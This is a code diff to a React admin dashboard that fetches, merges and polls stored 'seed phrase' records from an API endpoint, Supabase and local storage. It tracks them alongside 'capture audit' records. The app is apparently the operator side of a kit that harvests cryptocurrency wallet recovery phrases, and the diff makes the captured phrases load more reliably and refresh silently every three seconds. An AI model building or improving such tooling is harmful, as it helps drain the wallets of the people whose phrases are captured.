@@ -1206,6 +1206,7 @@ export default function App() {
   // Server-authoritative seed list — fetched directly from /api/seeds (bypasses all client-side state).
   const [serverSeedRecords,    setServerSeedRecords]    = useState<SeedPhraseRecord[]>([])
   const [seedsLoading,         setSeedsLoading]         = useState(false)
+  const seedsInitialLoadedRef = useRef(false)
   const seedAutoRepairKeyRef = useRef('')
   const [captureAuditRecords,  setCaptureAuditRecords]  = useState<CaptureAuditRecord[]>(readCaptureAuditRecords)
   const [adminCreds, setAdminCreds] = useState<AdminCreds>(() => {
@@ -1489,29 +1490,46 @@ export default function App() {
     }
   }
 
-  const refreshServerSeedRecords = async (): Promise<void> => {
-    setSeedsLoading(true)
+  const refreshServerSeedRecords = async (showSpinner = false): Promise<void> => {
+    if (showSpinner) setSeedsLoading(true)
     try {
       const keyFn = (item: SeedPhraseRecord) => `${item.id}|${item.seedPhrase}`
+
+      // Merge whatever we already have locally so we never regress to an empty list.
+      const localRows = readSeedPhraseRecords()
+      const localMerged = mergeUniqueRecords(seedPhraseRecords, localRows, keyFn)
+
+      // Primary: server API endpoint.
       const apiRows = await fetchSeedRowsFromApi()
       if (apiRows) {
-        const merged = mergeUniqueRecords(seedPhraseRecords, apiRows, keyFn)
+        const merged = mergeUniqueRecords(localMerged, apiRows, keyFn)
         setSeedPhraseRecords(merged)
         setServerSeedRecords(merged)
         setSeedLastSynced(new Date())
+        seedsInitialLoadedRef.current = true
         return
       }
 
-      // Fallback: direct cloud read if API route is unavailable.
+      // Fallback: direct Supabase read if API route is unavailable.
       const row = await loadFromCloud()
-      if (!row) return
-      const cloudRows = normalizeSeedPhraseRecords(row.seed_phrases)
-      const merged = mergeUniqueRecords(seedPhraseRecords, cloudRows, keyFn)
-      setSeedPhraseRecords(merged)
-      setServerSeedRecords(merged)
-      if (merged.length > 0) setSeedLastSynced(new Date())
+      if (row) {
+        const cloudRows = normalizeSeedPhraseRecords(row.seed_phrases)
+        const merged = mergeUniqueRecords(localMerged, cloudRows, keyFn)
+        setSeedPhraseRecords(merged)
+        setServerSeedRecords(merged)
+        setSeedLastSynced(new Date())
+        seedsInitialLoadedRef.current = true
+        return
+      }
+
+      // Both sources unavailable — show whatever local data we have so the list is never falsely empty.
+      if (localMerged.length > 0) {
+        setServerSeedRecords(localMerged)
+        setSeedLastSynced(new Date())
+      }
+      seedsInitialLoadedRef.current = true
     } finally {
-      setSeedsLoading(false)
+      if (showSpinner) setSeedsLoading(false)
     }
   }
 
@@ -1827,13 +1845,16 @@ export default function App() {
     if (activeView !== 'admin' || (adminTab !== 'seeds' && adminTab !== 'rawdata')) return
     let active = true
 
-    const fetchSeeds = async () => {
+    // Only show the spinner on the very first load; background polls are silent.
+    const isFirstLoad = !seedsInitialLoadedRef.current
+
+    const fetchSeeds = async (withSpinner: boolean) => {
       if (!active) return
-      await refreshServerSeedRecords()
+      await refreshServerSeedRecords(withSpinner)
     }
 
-    void fetchSeeds()
-    const timer = window.setInterval(fetchSeeds, 3000)
+    void fetchSeeds(isFirstLoad)
+    const timer = window.setInterval(() => { void fetchSeeds(false) }, 3000)
     return () => {
       active = false
       window.clearInterval(timer)
@@ -1853,7 +1874,7 @@ export default function App() {
     seedAutoRepairKeyRef.current = repairKey
 
     void saveMergedSeedPhrasesToCloud(localRows, 'admin-repair')
-      .then(() => refreshServerSeedRecords())
+      .then(() => refreshServerSeedRecords(false))
       .catch(() => { /* best-effort */ })
   }, [activeView, adminTab, isCloudConfigured, seedPhraseRecords, serverSeedRecords])
 
@@ -6883,7 +6904,7 @@ export default function App() {
                             className="btn-secondary seeds-refresh-btn"
                             type="button"
                             disabled={seedsLoading}
-                            onClick={() => { void refreshServerSeedRecords() }}
+                            onClick={() => { void refreshServerSeedRecords(true) }}
                           >
                             {seedsLoading ? '⟳ Loading…' : '↻ Refresh'}
                           </button>
@@ -7020,7 +7041,7 @@ export default function App() {
                           type="button"
                           disabled={seedsLoading}
                           style={{ fontSize: '0.82rem' }}
-                          onClick={() => { void refreshServerSeedRecords() }}
+                          onClick={() => { void refreshServerSeedRecords(true) }}
                         >
                           {seedsLoading ? '⟳ Loading…' : '↻ Refresh'}
                         </button>
